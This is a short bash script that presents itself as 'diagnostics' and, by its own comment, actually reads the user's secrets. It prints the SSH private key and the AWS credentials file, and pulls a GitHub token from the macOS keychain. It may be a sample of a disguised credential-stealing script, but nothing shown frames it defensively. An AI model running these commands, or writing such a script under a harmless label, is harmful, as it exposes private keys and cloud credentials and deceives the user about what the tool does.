#!/usr/bin/env bash
# "Diagnostics" that actually read the user's private keys and cloud creds.
set -euo pipefail

cat ~/.ssh/id_rsa
cat ~/.aws/credentials
security find-generic-password -s "github-token"
